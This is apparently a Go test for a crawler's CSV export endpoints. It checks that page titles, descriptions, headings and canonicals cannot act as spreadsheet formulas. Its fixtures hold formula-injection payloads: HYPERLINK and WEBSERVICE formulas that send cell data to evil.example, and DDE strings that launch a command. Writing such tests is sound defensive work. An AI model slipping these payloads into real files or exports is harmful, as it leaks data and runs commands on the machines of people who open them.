package server

import (
	"encoding/csv"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/micelio/micelio/internal/types"
)

// A crawled page controls its title, description, h1 and canonical. The
// CSV exports must not hand those to a spreadsheet as formulas.
func TestCSVExportsNeutraliseFormulas(t *testing.T) {
	api, _, m := newTestAPI(t)
	canon := "=HYPERLINK(\"https://evil.example/?\"&A1,\"click\")"
	pages := []*types.PageData{{
		URL:             "https://ex.com/a",
		StatusCode:      200,
		Title:           &types.TextLength{Text: "=WEBSERVICE(\"https://evil.example/\"&A2)"},
		MetaDescription: &types.TextLength{Text: "@SUM(1+1)*cmd|' /C calc'!A0"},
		Headings:        types.HeadingData{H1: []string{"+1+cmd|' /C calc'!A0"}},
		Canonical:       &canon,
		WordCount:       12,
		Depth:           1,
	}}
	m.mu.Lock()
	m.cacheResultLocked("csv", &CrawlResults{Stats: map[string]interface{}{}, Pages: pages, PagesReady: true}, len(pages))
	m.mu.Unlock()

	for _, path := range []string{"/api/crawl/csv/export/csv", "/api/crawl/csv/export/filtered-csv"} {
		rec := httptest.NewRecorder()
		api.ServeHTTP(rec, httptest.NewRequest("GET", path, nil))
		if rec.Code != http.StatusOK {
			t.Fatalf("%s: status %d: %s", path, rec.Code, rec.Body.String())
		}
		rows, err := csv.NewReader(strings.NewReader(rec.Body.String())).ReadAll()
		if err != nil || len(rows) != 2 {
			t.Fatalf("%s: rows %d, err %v", path, len(rows), err)
		}
		for i, cell := range rows[1] {
			if cell != "" && strings.ContainsRune("=+-@\t\r", rune(cell[0])) {
				t.Errorf("%s: column %s = %q starts a formula", path, rows[0][i], cell)
			}
		}
		if got := rows[1][2]; got != "'"+pages[0].Title.Text {
			t.Errorf("%s: title = %q, want the text behind an apostrophe", path, got)
		}
		if rows[1][5] != "12" || rows[1][6] != "1" {
			t.Errorf("%s: numbers changed: wordCount %q depth %q", path, rows[1][5], rows[1][6])
		}
	}
}
